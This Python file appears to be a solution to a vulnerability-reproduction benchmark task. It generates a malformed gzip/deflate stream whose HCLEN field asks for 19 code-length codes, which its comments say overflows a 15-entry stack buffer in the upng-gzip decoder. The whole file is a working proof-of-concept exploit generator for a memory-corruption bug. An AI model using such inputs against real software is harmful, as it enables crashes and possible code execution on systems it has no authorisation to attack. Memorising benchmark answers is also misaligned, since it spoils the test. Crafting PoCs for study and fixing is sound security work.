import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in upng-gzip.
        The vulnerability occurs when reading the code lengths for the Huffman code length alphabet.
        The buffer is sized 15, but HCLEN can specify up to 19 codes, causing an overflow.
        """
        # Gzip Header: ID1 ID2 CM FLG MTIME XFL OS
        # 1f 8b (Magic), 08 (Deflate), 00 (Flags), 00000000 (Time), 00 (XFL), ff (OS)
        poc = bytearray(b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff')
        
        # Bit packing state
        bits = 0
        bit_count = 0
        
        def write_bits(value, length):
            nonlocal bits, bit_count, poc
            # Mask value to length bits and shift
            bits |= (value & ((1 << length) - 1)) << bit_count
            bit_count += length
            # Flush bytes
            while bit_count >= 8:
                poc.append(bits & 0xFF)
                bits >>= 8
                bit_count -= 8
        
        # Deflate Block Header
        # BFINAL = 1 (1 bit) - Final block
        write_bits(1, 1)
        # BTYPE = 2 (2 bits) - Dynamic Huffman (binary 10)
        write_bits(2, 2)
        
        # HLIT (5 bits): Number of Literal/Length codes - 257
        # Value 0 -> 257 codes (minimum)
        write_bits(0, 5)
        
        # HDIST (5 bits): Number of Distance codes - 1
        # Value 0 -> 1 code (minimum)
        write_bits(0, 5)
        
        # HCLEN (4 bits): Number of Code Length codes - 4
        # Value 15 -> 19 codes (maximum)
        # The vulnerability is triggered here: the decoder reads 19 codes into a buffer of size 15.
        write_bits(15, 4)
        
        # Code lengths for the code length alphabet
        # We must provide 19 codes, each 3 bits.
        # The values don't strictly matter for the overflow logic, 0 is valid.
        for _ in range(19):
            write_bits(0, 3)
            
        # Flush remaining bits to byte alignment
        if bit_count > 0:
            poc.append(bits & 0xFF)
            
        return bytes(poc)
